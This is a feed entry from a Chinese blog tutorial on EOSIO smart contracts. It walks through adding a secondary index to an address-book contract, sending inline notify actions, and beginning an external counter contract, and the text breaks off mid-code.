    <link href="https://ggyggy666.github.io/2021/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/03/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%B9%8BEOS%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2021-03-18T04:13:02.000Z</published>
    <updated>2021-03-19T09:09:48.504Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇讲到了对合约创建表，修改和删除表中记录。本次则显示如何持久存储合约使用的数据以及创建许多索引来访问该数据。</p><a id="more"></a><h1 id="二级索引"><a href="#二级索引" class="headerlink" title="二级索引"></a>二级索引</h1><p>EOSIO能按最多16个索引来对表进行排序。</p><h2 id="删除表中现有数据"><a href="#删除表中现有数据" class="headerlink" title="删除表中现有数据"></a>删除表中现有数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook erase &#39;[&quot;alice&quot;]&#39; -p alice@active</span><br><span class="line">cleos push action addressbook erase &#39;[&quot;bob&quot;]&#39; -p bob@active</span><br></pre></td></tr></table></figure><p>删除之前添加的alice和bob的记录。</p><h2 id="添加新的索引成员及其获取器"><a href="#添加新的索引成员及其获取器" class="headerlink" title="添加新的索引成员及其获取器"></a>添加新的索引成员及其获取器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint64_t age;</span><br><span class="line">uint64_t get_secondary_1() const &#123;return age;&#125;</span><br></pre></td></tr></table></figure><p>之前是用key作为唯一主键，现在使用一个age（数字字段）作为二级索引，然后使用get_secondary_1函数来返回这个age。</p><h2 id="添加辅助索引到addresses表配置"><a href="#添加辅助索引到addresses表配置" class="headerlink" title="添加辅助索引到addresses表配置"></a>添加辅助索引到addresses表配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using address_index &#x3D; eosio::multi_index&lt;&quot;people&quot;_n, person, indexed_by&lt;&quot;byage&quot;_n,const_mem_fun&lt;person, uint64_t, &amp;person::get_secondary_1&gt;&gt;&gt;;</span><br></pre></td></tr></table></figure><p>在第三个结构中，传递了一个indexed_by用于实例化索引的结构。index名称是byage, 第二个类型参数是函数调用运算符，该函数将const值提取为索引键。将其指向我们先前创建的get_secondary_1，以便此多索引表将按age变量对记录进行索引。</p><h2 id="修改upsert程序"><a href="#修改upsert程序" class="headerlink" title="修改upsert程序"></a>修改upsert程序</h2><p>upsert参数值增加一个age, 之后初始化的时候也增加一个row.age = age即可。</p><h2 id="编译-部署"><a href="#编译-部署" class="headerlink" title="编译/部署"></a>编译/部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eosio-cpp --abigen addressbook.cpp -o addressbook.wasm&#x2F;&#x2F;编译</span><br><span class="line">cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook&#x2F;&#x2F;部署</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>插入alice和bob的记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, 9, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@active</span><br><span class="line"></span><br><span class="line">cleos push action addressbook upsert &#39;[&quot;bob&quot;, &quot;bob&quot;, &quot;is a guy&quot;, 49, &quot;doesnt exist&quot;, &quot;somewhere&quot;, &quot;someplace&quot;]&#39; -p bob@active</span><br></pre></td></tr></table></figure><p>通过年龄age索引来查找alice的地址，–index 2参数用于表示使用二级索引查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cleos get table addressbook addressbook people --upper 10 \</span><br><span class="line">--key-type i64 \</span><br><span class="line">--index 2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;按bob的年龄</span><br><span class="line">cleos get table addressbook addressbook people --upper 50 --key-type i64 --index 2</span><br></pre></td></tr></table></figure><h2 id="最终完整合约"><a href="#最终完整合约" class="headerlink" title="最终完整合约"></a>最终完整合约</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/print.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"addressbook"</span>)]] addressbook : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  addressbook(name receiver, name code,  datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">upsert</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> first_name, <span class="built_in">std</span>::<span class="built_in">string</span> last_name, <span class="keyword">uint64_t</span> age, <span class="built_in">std</span>::<span class="built_in">string</span> street, <span class="built_in">std</span>::<span class="built_in">string</span> city, <span class="built_in">std</span>::<span class="built_in">string</span> state)</span> </span>&#123;</span><br><span class="line">    require_auth( user );</span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(),get_first_receiver().value)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    <span class="keyword">if</span>( iterator == addresses.end() )</span><br><span class="line">    &#123;</span><br><span class="line">      addresses.emplace(user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">       row.key = user;</span><br><span class="line">       row.first_name = first_name;</span><br><span class="line">       row.last_name = last_name;</span><br><span class="line">       row.age = age;</span><br><span class="line">       row.street = street;</span><br><span class="line">       row.city = city;</span><br><span class="line">       row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      addresses.modify(iterator, user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">        row.key = user;</span><br><span class="line">        row.first_name = first_name;</span><br><span class="line">        row.last_name = last_name;</span><br><span class="line">        row.age = age;</span><br><span class="line">        row.street = street;</span><br><span class="line">        row.city = city;</span><br><span class="line">        row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(name user)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line"></span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_self(), get_first_receiver().value)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    check(iterator != addresses.end(), <span class="string">"Record does not exist"</span>);</span><br><span class="line">    addresses.erase(iterator);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] person &#123;</span><br><span class="line">    name key;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> first_name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> last_name;</span><br><span class="line">    <span class="keyword">uint64_t</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> street;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> key.value; &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> get_secondary_1() <span class="keyword">const</span> &#123; <span class="keyword">return</span> age; &#125;</span><br><span class="line"></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">using</span> address_index = eosio::multi_index&lt;<span class="string">"people"</span>_n, person, indexed_by&lt;<span class="string">"byage"</span>_n, const_mem_fun&lt;person, <span class="keyword">uint64_t</span>, &amp;person::get_secondary_1&gt;&gt;&gt;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="添加内联操作"><a href="#添加内联操作" class="headerlink" title="添加内联操作"></a>添加内联操作</h1><p>从合约调用内联操作。首先得构造出这些action，然后从合约中发送这些action。其实就是<strong>在执行一些操作后，发送一些通知消息，比如成功修改记录这些.</strong></p><h2 id="将eosio-code添加到权限"><a href="#将eosio-code添加到权限" class="headerlink" title="将eosio.code添加到权限"></a>将eosio.code添加到权限</h2><p>将eosio.code权限添加到合同账户的合同权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos set account permission addressbook active --add-code</span><br></pre></td></tr></table></figure><p>授权后才能使合同执行内联操作。</p><h2 id="通知action"><a href="#通知action" class="headerlink" title="通知action"></a>通知action</h2><p>在之前的addressbook类中创建一个辅助函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[[eosio::action]]</span><br><span class="line">void notify(name user, std::string msg)&#123;&#125;</span><br></pre></td></tr></table></figure><p>user表示是通知哪个用户，msg表示发送的消息。</p><p>需要将用户添加到require_recipient中，然后要求发送消息是给require_recipient中的用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_recipient(user);</span><br></pre></td></tr></table></figure><p>然后这样任何用户都可以调用这个Notify函数，因此需要确保是合约自身调用的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_auth(get_self());</span><br></pre></td></tr></table></figure><p>如果bob用户传参alice会发生异常。</p><h2 id="action构造器"><a href="#action构造器" class="headerlink" title="action构造器"></a>action构造器</h2><p>内联操作会被多次调用，因此最好编写快速构造器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private:</span><br><span class="line">void send_summary(name user, std::string message)&#123;</span><br><span class="line">action(</span><br><span class="line">permission_level&#123;get_self(), &quot;active&quot;_n&#125;,</span><br><span class="line">            get_self(),</span><br><span class="line">            &quot;notify&quot;_n,</span><br><span class="line">            std::make_tuple(user, name&#123;user&#125;.to_string()+message)</span><br><span class="line">).send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该action构造器需要4个参数：</p><ul><li>permission_level结构：要授权得到许可，应使用active授权机构用来授权get_self()。</li><li>调用合约的user：最后就是使用get_self()。</li><li>action：使用上面已经创建的notify函数。_n是运算符。</li><li>传递的数据：由nofity函数可知，接受两个参数user和message, 而这个action构造器接受byte类型的，因此需要使用make_tuple函数将这两个数据连接起来转成byte类型。</li></ul><p>最后发送动作：.send();</p><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><ul><li><p>合约部署后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_summary(user, &quot;successfully implaced record to addressbook&quot;);</span><br></pre></td></tr></table></figure></li><li><p>合约的记录修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_summary(user, &quot;successfully modified record in addressbook&quot;);</span><br></pre></td></tr></table></figure></li><li><p>合约的记录删除后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_summary(user, &quot;successfully erased record from addressbook&quot;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终完整合约-1"><a href="#最终完整合约-1" class="headerlink" title="最终完整合约"></a>最终完整合约</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/print.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"addressbook"</span>)]] addressbook : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  addressbook(name receiver, name code,  datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">upsert</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> first_name, <span class="built_in">std</span>::<span class="built_in">string</span> last_name, <span class="keyword">uint64_t</span> age, <span class="built_in">std</span>::<span class="built_in">string</span> street, <span class="built_in">std</span>::<span class="built_in">string</span> city, <span class="built_in">std</span>::<span class="built_in">string</span> state)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    <span class="keyword">if</span>( iterator == addresses.end() )</span><br><span class="line">    &#123;</span><br><span class="line">      addresses.emplace(user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">       row.key = user;</span><br><span class="line">       row.first_name = first_name;</span><br><span class="line">       row.last_name = last_name;</span><br><span class="line">       row.age = age;</span><br><span class="line">       row.street = street;</span><br><span class="line">       row.city = city;</span><br><span class="line">       row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">      send_summary(user, <span class="string">" successfully emplaced record to addressbook"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      addresses.modify(iterator, user, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">        row.key = user;</span><br><span class="line">        row.first_name = first_name;</span><br><span class="line">        row.last_name = last_name;</span><br><span class="line">        row.street = street;</span><br><span class="line">        row.city = city;</span><br><span class="line">        row.state = state;</span><br><span class="line">      &#125;);</span><br><span class="line">      send_summary(user, <span class="string">" successfully modified record to addressbook"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">(name user)</span> </span>&#123;</span><br><span class="line">    require_auth(user);</span><br><span class="line"></span><br><span class="line">    <span class="function">address_index <span class="title">addresses</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> iterator = addresses.find(user.value);</span><br><span class="line">    check(iterator != addresses.end(), <span class="string">"Record does not exist"</span>);</span><br><span class="line">    addresses.erase(iterator);</span><br><span class="line">    send_summary(user, <span class="string">" successfully erased record from addressbook"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [[eosio::action]]</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">notify</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> msg)</span> </span>&#123;</span><br><span class="line">    require_auth(get_self());</span><br><span class="line">    require_recipient(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] person &#123;</span><br><span class="line">    name key;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> first_name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> last_name;</span><br><span class="line">    <span class="keyword">uint64_t</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> street;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> key.value; &#125;</span><br><span class="line">    <span class="keyword">uint64_t</span> get_secondary_1() <span class="keyword">const</span> &#123; <span class="keyword">return</span> age;&#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">send_summary</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> message)</span> </span>&#123;</span><br><span class="line">    action(</span><br><span class="line">      permission_level&#123;get_self(),<span class="string">"active"</span>_n&#125;,</span><br><span class="line">      get_self(),</span><br><span class="line">      <span class="string">"notify"</span>_n,</span><br><span class="line">      <span class="built_in">std</span>::make_tuple(user, name&#123;user&#125;.to_string() + message)</span><br><span class="line">    ).send();</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">typedef</span> eosio::multi_index&lt;<span class="string">"people"</span>_n, person,</span><br><span class="line">    indexed_by&lt;<span class="string">"byage"</span>_n, const_mem_fun&lt;person, <span class="keyword">uint64_t</span>, &amp;person::get_secondary_1&gt;&gt;</span><br><span class="line">  &gt; address_index;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="编译-部署-1"><a href="#编译-部署-1" class="headerlink" title="编译/部署"></a>编译/部署</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook</span><br><span class="line"></span><br><span class="line">eosio-cpp -o addressbook.wasm addressbook.cpp --abigen</span><br><span class="line"></span><br><span class="line">cleos set contract addressbook &#x2F;home&#x2F;ggy&#x2F;桌面&#x2F;blockchain&#x2F;contracts&#x2F;addressbook</span><br></pre></td></tr></table></figure><h2 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;alice&quot;, &quot;alice&quot;, &quot;liddell&quot;, 21, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p alice@active</span><br></pre></td></tr></table></figure><p>增加一条alice记录, 但是出错了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Error 3050003: eosio_assert_message assertion failure</span><br><span class="line">Error Details:</span><br><span class="line">assertion failure with message: read</span><br><span class="line">pending console output:</span><br></pre></td></tr></table></figure><p>于是换了一个账户就行了。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos push action addressbook upsert &#39;[&quot;addressbook&quot;, &quot;addressbook&quot;, &quot;liddell&quot;, 21, &quot;123 drink me way&quot;, &quot;wonderland&quot;, &quot;amsterdam&quot;]&#39; -p addressbook@active</span><br></pre></td></tr></table></figure><p>成功增加一条记录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cleos get actions addressbook</span><br></pre></td></tr></table></figure><p>显示已执行的与addressbook相关的action。</p><h1 id="对外部合约的内联操作"><a href="#对外部合约的内联操作" class="headerlink" title="对外部合约的内联操作"></a>对外部合约的内联操作</h1><p>上面是对合约内部的操作，接下来是对外部合约的操作。</p><h2 id="创建外部合约"><a href="#创建外部合约" class="headerlink" title="创建外部合约"></a>创建外部合约</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /home/ggy/桌面/blockchain/contracts</span><br><span class="line">mkdir abcounter</span><br><span class="line">cd abcounter</span><br><span class="line">touch abcounter.cpp</span><br></pre></td></tr></table></figure><p>vim打开后，输入以下合约代码保存：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;eosio/eosio.hpp&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> eosio;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> [[<span class="title">eosio</span>:</span>:contract(<span class="string">"abcounter"</span>)]] abcounter : <span class="keyword">public</span> eosio::contract &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    abcounter(name receiver, name code,  datastream&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; ds): contract(receiver, code, ds) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    [[eosio::action]]</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">count</span><span class="params">(name user, <span class="built_in">std</span>::<span class="built_in">string</span> type)</span> </span>&#123;</span><br><span class="line">      require_auth( name(<span class="string">"addressbook"</span>));<span class="comment">//限制只能addressbook合约调用</span></span><br><span class="line">      <span class="function">count_index <span class="title">counts</span><span class="params">(get_first_receiver(), get_first_receiver().value)</span></span>;</span><br><span class="line">      <span class="keyword">auto</span> iterator = counts.find(user.value);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (iterator == counts.end()) &#123;</span><br><span class="line">        counts.emplace(<span class="string">"addressbook"</span>_n, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">          row.key = user;</span><br><span class="line">          row.emplaced = (type == <span class="string">"emplace"</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">          row.modified = (type == <span class="string">"modify"</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">          row.erased = (type == <span class="string">"erase"</span>) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        counts.modify(iterator, <span class="string">"addressbook"</span>_n, [&amp;]( <span class="keyword">auto</span>&amp; row ) &#123;</span><br><span class="line">          <span class="keyword">if</span>(type == <span class="string">"emplace"</span>) &#123; row.emplaced += <span class="number">1</span>; &#125;</span><br><span class="line">          <span class="keyword">if</span>(type == <span class="string">"modify"</span>) &#123; row.modified += <span class="number">1</span>; &#125;</span><br><span class="line">          <span class="keyword">if</span>(type == <span class="string">"erase"</span>) &#123; row.erased += <span class="number">1</span>; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//动作包装器，第一个参数是要调用的动作，第二个则是指向动作函数</span></span><br><span class="line">    <span class="keyword">using</span> count_action = action_wrapper&lt;<span class="string">"count"</span>_n, &amp;abcounter::count&gt;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> [[<span class="title">eosio</span>:</span>:table]] counter &#123;</span><br><span class="line">      name key;</span><br><span class="line">      <span class="keyword">uint64_t</span> emplaced;</span><br><span class="line">      <span class="keyword">uint64_t</span> modified;</span><br><span class="line">      <span class="keyword">uint64_t</span> erased;</span><br><span class="line">      <span class="keyword">uint64_t</span> primary_key() <span class="keyword">const</span> &#123; <span class="keyword">return</span> key.value; &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span 